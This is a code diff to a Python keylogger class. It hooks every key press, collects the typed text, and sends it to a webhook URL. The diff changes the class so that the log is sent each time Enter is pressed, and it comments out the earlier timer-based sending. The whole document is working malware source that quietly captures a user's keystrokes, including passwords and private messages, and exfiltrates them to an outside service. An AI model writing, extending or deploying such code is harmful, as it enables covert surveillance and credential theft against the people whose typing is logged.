@@ -33,6 +33,7 @@ class Keylogger:
         self.interval = interval
         self.log = ""
         self.url = url
+        #self.timer = Timer(interval=self.interval, function=self.report)
 
     #callback happens when a key in pressed with the import of keyboard
     #the callback method has 1 argument, event (which will be for exampel keyboard.Key.enter, with the name being enter)
@@ -44,7 +45,10 @@ class Keylogger:
             if name == "space":
                 name = " "
             elif name == "enter":
-                name = "\n"
+                self.log+=" [ENTER] "    
+                name=""
+                self.report() #delete these two lines in case of timer
+                self.log =""
             elif name == "decimal":
                 name = "."
             elif name == "tab":
@@ -60,7 +64,9 @@ class Keylogger:
             else: 
                 name = "" 
         #append the capture to our log
-        self.log += name 
+        self.log += name
+        
+        
 
     #reporting the lgos
     def report(self):
@@ -69,23 +75,25 @@ class Keylogger:
             #make a new webhook object with our url
             webhook = SyncWebhook.from_url(self.url)
             #send the current log string 
-            webhook.send(self.log) 
-        #resetting the log string
-        self.log = "" 
-        #defining a new timer with our interval and pointing to this function, so it only executes every <interval> seconds
-        timer = Timer(interval=self.interval, function=self.report) 
-        #keeps on going
-        timer.daemon = True
-        # start the timer 
-        timer.start() 
+            webhook.send(self.log)
 
+        #__________________WITH TIMER_______________________________________________________________________________________
+        #resetting the log string
+        #self.log = "" 
+        #defining a new timer with our interval and pointing to this function, so it only executes every <interval> seconds
+        #timer = Timer(interval=self.interval, function=self.report) 
+        #keeps on going
+        #timer.daemon = True
+        # start the timer 
+        #timer.start() 
+        #____________________________________________________________________________________________________________________
+        
 
     def start(self):
         # start the keylogger
         keyboard.on_press(callback=self.callback)#also possible with the .on_release, however we found skipped inputs in our final logs
         #report the log
         self.report()
-        #wait for keyboard input
         keyboard.wait()
 
 #main method, will create a keylogger that will handle the rest
